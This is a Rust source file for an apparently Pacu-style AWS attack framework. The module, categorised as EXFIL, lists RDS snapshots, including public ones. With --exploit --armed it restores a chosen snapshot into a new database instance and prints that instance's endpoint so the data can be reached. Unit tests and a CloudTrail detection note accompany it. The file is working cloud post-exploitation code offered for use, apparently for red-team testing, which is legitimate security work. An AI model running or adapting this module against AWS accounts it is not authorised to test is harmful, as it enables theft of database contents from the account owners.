//! rds__explore_snapshots — enumerate RDS snapshots and optionally restore them.
//!
//! Category: EXFIL. Services: ["RDS"].
//!
//! Args:
//!   --snapshot-id <id>       target a specific snapshot
//!   --list                   list all RDS snapshots (read-only)
//!   --public                 include public snapshots (restorable by "all")
//!   --db-instance-id <id>    DB instance ID for restore (required with --exploit)
//!   --subnet-group <name>    DB subnet group for restore (required with --exploit)
//!   --exploit                actually restore the snapshot (requires --armed)
//!
//! Detection note: rds:RestoreDBInstanceFromDBSnapshot appears in CloudTrail.

use colored::Colorize;
use comfy_table::{Cell, Table, presets::UTF8_FULL};
use serde::{Deserialize, Serialize};

use crate::module::{AwsContext, Module, ModuleInfo};

// ---------------------------------------------------------------------------
// Data structs
// ---------------------------------------------------------------------------

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct RdsSnapshot {
    pub snapshot_id: String,
    pub db_instance_id: String,
    pub snapshot_type: String,
    pub status: String,
    pub created: Option<String>,
    pub encrypted: bool,
    pub engine: String,
}

// ---------------------------------------------------------------------------
// Module entry point
// ---------------------------------------------------------------------------

pub async fn run(ctx: &AwsContext, args: &[&str]) -> anyhow::Result<()> {
    // ── Parse args ─────────────────────────────────────────────────────────
    let snapshot_id: Option<&str> = args
        .iter()
        .position(|&a| a == "--snapshot-id")
        .and_then(|i| args.get(i + 1).copied());

    let db_instance_id: Option<&str> = args
        .iter()
        .position(|&a| a == "--db-instance-id")
        .and_then(|i| args.get(i + 1).copied());

    let subnet_group: Option<&str> = args
        .iter()
        .position(|&a| a == "--subnet-group")
        .and_then(|i| args.get(i + 1).copied());

    let list_only = args.contains(&"--list");
    let include_public = args.contains(&"--public");
    let exploit = args.contains(&"--exploit");

    println!("{}", "rds__explore_snapshots".cyan().bold());
    println!(
        "  {}\n",
        "Enumerate RDS snapshots and optionally restore them.".yellow()
    );

    if exploit && !ctx.armed {
        eprintln!(
            "{}",
            "Error: --exploit requires --armed. Pass --armed when starting pacu."
                .red()
                .bold()
        );
        return Ok(());
    }

    let rds = aws_sdk_rds::Client::new(&ctx.sdk_config);

    // ── Dry-run restore intent ─────────────────────────────────────────────
    if exploit && ctx.dry_run {
        let sid = snapshot_id.unwrap_or("<snapshot_id>");
        println!(
            "  {} Would call: rds:RestoreDBInstanceFromDBSnapshot from {}",
            "[DRY-RUN]".cyan(),
            sid.yellow()
        );
        return Ok(());
    }

    // ── Exploit / restore mode ─────────────────────────────────────────────
    if exploit && ctx.armed {
        let sid = match snapshot_id {
            Some(s) => s,
            None => anyhow::bail!("--snapshot-id <id> is required with --exploit"),
        };
        let instance_id = match db_instance_id {
            Some(id) => id,
            None => anyhow::bail!("--db-instance-id <id> is required with --exploit"),
        };
        let sg = match subnet_group {
            Some(s) => s,
            None => anyhow::bail!("--subnet-group <name> is required with --exploit"),
        };

        return do_restore(&rds, sid, instance_id, sg).await;
    }

    // ── List / default (safe) mode ─────────────────────────────────────────
    let mut snapshots: Vec<RdsSnapshot> = Vec::new();

    // List own snapshots
    let own = list_snapshots(&rds, snapshot_id, false).await?;
    snapshots.extend(own);

    // Optionally list public snapshots
    if include_public {
        println!("  {} Fetching public snapshots...", "[INFO]".cyan());
        let public = list_snapshots(&rds, snapshot_id, true).await?;
        snapshots.extend(public);
    }

    display_snapshots(&snapshots);

    if !list_only {
        println!(
            "\n{}",
            "Run with --exploit --armed --db-instance-id <id> --subnet-group <name> to restore a snapshot."
                .yellow()
        );
    }

    Ok(())
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

async fn list_snapshots(
    rds: &aws_sdk_rds::Client,
    snapshot_id: Option<&str>,
    include_public: bool,
) -> anyhow::Result<Vec<RdsSnapshot>> {
    let mut snapshots: Vec<RdsSnapshot> = Vec::new();
    let mut marker: Option<String> = None;

    loop {
        let mut req = rds.describe_db_snapshots();

        if let Some(sid) = snapshot_id {
            req = req.db_snapshot_identifier(sid);
        }

        if include_public {
            req = req.include_public(true);
        } else {
            // owner = self (default, but explicit)
            req = req.snapshot_type("manual");
        }

        if let Some(ref m) = marker {
            req = req.marker(m);
        }

        match req.send().await {
            Ok(resp) => {
                for snap in resp.db_snapshots() {
                    let created = snap.snapshot_create_time().map(|dt| {
                        dt.fmt(aws_sdk_rds::primitives::DateTimeFormat::DateTime)
                            .unwrap_or_else(|_| "<invalid>".to_owned())
                    });

                    snapshots.push(RdsSnapshot {
                        snapshot_id: snap
                            .db_snapshot_identifier()
                            .unwrap_or("<unknown>")
                            .to_owned(),
                        db_instance_id: snap
                            .db_instance_identifier()
                            .unwrap_or("<unknown>")
                            .to_owned(),
                        snapshot_type: snap.snapshot_type().unwrap_or("<unknown>").to_owned(),
                        status: snap.status().unwrap_or("<unknown>").to_owned(),
                        created,
                        encrypted: snap.encrypted().unwrap_or(false),
                        engine: snap.engine().unwrap_or("<unknown>").to_owned(),
                    });
                }

                marker = resp.marker().map(|s| s.to_owned());
                if marker.is_none() {
                    break;
                }
            }
            Err(e) => {
                eprintln!("  {} rds:DescribeDBSnapshots failed: {}", "[ERR]".red().bold(), e);
                break;
            }
        }
    }

    Ok(snapshots)
}

fn display_snapshots(snapshots: &[RdsSnapshot]) {
    if snapshots.is_empty() {
        println!("  {} No RDS snapshots found.", "[INFO]".cyan());
        return;
    }

    println!(
        "  {} Found {} snapshot(s):",
        "[FOUND]".green().bold(),
        snapshots.len()
    );

    let mut table = Table::new();
    table.load_preset(UTF8_FULL);
    table.set_header(vec![
        "SnapshotId",
        "DBInstanceId",
        "SnapshotType",
        "Status",
        "Created",
        "Encrypted",
        "Engine",
    ]);

    for s in snapshots {
        table.add_row(vec![
            Cell::new(&s.snapshot_id),
            Cell::new(&s.db_instance_id),
            Cell::new(&s.snapshot_type),
            Cell::new(&s.status),
            Cell::new(s.created.as_deref().unwrap_or("-")),
            Cell::new(if s.encrypted { "Yes" } else { "No" }),
            Cell::new(&s.engine),
        ]);
    }

    println!("{table}");
}

async fn do_restore(
    rds: &aws_sdk_rds::Client,
    snapshot_id: &str,
    db_instance_id: &str,
    subnet_group: &str,
) -> anyhow::Result<()> {
    println!(
        "  {} Calling rds:RestoreDBInstanceFromDBSnapshot (snapshot={}, instance={}, subnet-group={})...",
        "[EXEC]".red().bold(),
        snapshot_id.yellow(),
        db_instance_id.yellow(),
        subnet_group.yellow()
    );
    println!(
        "  {}",
        "WARNING: rds:RestoreDBInstanceFromDBSnapshot appears in CloudTrail.".red()
    );

    rds.restore_db_instance_from_db_snapshot()
        .db_snapshot_identifier(snapshot_id)
        .db_instance_identifier(db_instance_id)
        .db_subnet_group_name(subnet_group)
        .send()
        .await
        .map_err(|e| anyhow::anyhow!("rds:RestoreDBInstanceFromDBSnapshot failed: {e}"))?;

    println!(
        "  {} Restore initiated. Polling for availability (max 10 min, every 30s)...",
        "[OK]".green().bold()
    );

    // Poll up to 10 minutes (20 x 30s)
    for attempt in 1..=20 {
        tokio::time::sleep(std::time::Duration::from_secs(30)).await;

        let resp = rds
            .describe_db_instances()
            .db_instance_identifier(db_instance_id)
            .send()
            .await
            .map_err(|e| anyhow::anyhow!("rds:DescribeDBInstances failed: {e}"))?;

        if let Some(inst) = resp.db_instances().first() {
            let status = inst.db_instance_status().unwrap_or("unknown");
            println!("  [{attempt}/20] Status: {}", status.yellow());

            if status == "available" {
                if let Some(ep) = inst.endpoint() {
                    let host = ep.address().unwrap_or("<unknown>");
                    let port = ep.port().unwrap_or(0);
                    println!(
                        "\n  {} Instance available at {}:{}",
                        "[OK]".green().bold(),
                        host.green(),
                        port
                    );
                    println!(
                        "  {}",
                        "Connect with your credentials."
                            .green()
                    );
                }
                return Ok(());
            }
        }
    }

    println!(
        "  {} Timed out waiting for instance to become available.",
        "[WARN]".yellow()
    );

    Ok(())
}

// ---------------------------------------------------------------------------
// Module registration
// ---------------------------------------------------------------------------

inventory::submit! {
    Module {
        info: ModuleInfo {
            name: "rds__explore_snapshots",
            author: "lancer-pacu",
            category: "EXFIL",
            one_liner: "Enumerate RDS snapshots and optionally restore them. --exploit + --armed to restore.",
            services: &["RDS"],
        },
        run: |ctx, args| Box::pin(run(ctx, args)),
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------
#[cfg(test)]
mod tests {
    use super::*;
    use crate::module::Module;

    #[test]
    fn module_registered_in_inventory() {
        let found = inventory::iter::<Module>
            .into_iter()
            .any(|m| m.info.name == "rds__explore_snapshots");
        assert!(found, "rds__explore_snapshots not found in inventory");
    }

    #[test]
    fn module_category_is_exfil() {
        let m = inventory::iter::<Module>
            .into_iter()
            .find(|m| m.info.name == "rds__explore_snapshots")
            .expect("rds__explore_snapshots not found");
        assert_eq!(m.info.category, "EXFIL");
    }

    #[test]
    fn module_services_include_rds() {
        let m = inventory::iter::<Module>
            .into_iter()
            .find(|m| m.info.name == "rds__explore_snapshots")
            .expect("rds__explore_snapshots not found");
        assert!(m.info.services.contains(&"RDS"));
    }

    #[test]
    fn rds_snapshot_serde_round_trip() {
        let snap = RdsSnapshot {
            snapshot_id: "rds:mydb-2024-01-01-00-00".to_owned(),
            db_instance_id: "mydb".to_owned(),
            snapshot_type: "automated".to_owned(),
            status: "available".to_owned(),
            created: Some("2024-01-01T00:00:00Z".to_owned()),
            encrypted: true,
            engine: "mysql".to_owned(),
        };

        let json = serde_json::to_string(&snap).unwrap();
        let back: RdsSnapshot = serde_json::from_str(&json).unwrap();

        assert_eq!(back.snapshot_id, snap.snapshot_id);
        assert_eq!(back.db_instance_id, snap.db_instance_id);
        assert_eq!(back.snapshot_type, snap.snapshot_type);
        assert_eq!(back.status, snap.status);
        assert_eq!(back.created, snap.created);
        assert_eq!(back.encrypted, snap.encrypted);
        assert_eq!(back.engine, snap.engine);
    }

    #[tokio::test]
    async fn exploit_without_armed_returns_ok() {
        let sdk_config = aws_config::defaults(aws_config::BehaviorVersion::latest())
            .no_credentials()
            .load()
            .await;
        let ctx = crate::module::AwsContext {
            dry_run: true,
            armed: false,
            sdk_config,
            db_pool: None,
        };
        let result = super::run(
            &ctx,
            &["--exploit", "--snapshot-id", "rds:mydb-snap"],
        )
        .await;
        assert!(
            result.is_ok(),
            "exploit without armed should return Ok: {:?}",
            result.err()
        );
    }

    #[tokio::test]
    async fn exploit_missing_db_instance_id_errors() {
        let sdk_config = aws_config::defaults(aws_config::BehaviorVersion::latest())
            .no_credentials()
            .load()
            .await;
        let ctx = crate::module::AwsContext {
            dry_run: false,
            armed: true,
            sdk_config,
            db_pool: None,
        };
        let result = super::run(
            &ctx,
            &["--exploit", "--snapshot-id", "rds:mydb-snap", "--subnet-group", "mysg"],
        )
        .await;
        assert!(result.is_err(), "expected error when --db-instance-id is missing");
        let msg = result.unwrap_err().to_string();
        assert!(
            msg.contains("--db-instance-id"),
            "error should mention --db-instance-id: {msg}"
        );
    }

    #[tokio::test]
    async fn exploit_missing_subnet_group_errors() {
        let sdk_config = aws_config::defaults(aws_config::BehaviorVersion::latest())
            .no_credentials()
            .load()
            .await;
        let ctx = crate::module::AwsContext {
            dry_run: false,
            armed: true,
            sdk_config,
            db_pool: None,
        };
        let result = super::run(
            &ctx,
            &[
                "--exploit",
                "--snapshot-id",
                "rds:mydb-snap",
                "--db-instance-id",
                "temp-db",
            ],
        )
        .await;
        assert!(result.is_err(), "expected error when --subnet-group is missing");
        let msg = result.unwrap_err().to_string();
        assert!(
            msg.contains("--subnet-group"),
            "error should mention --subnet-group: {msg}"
        );
    }
}
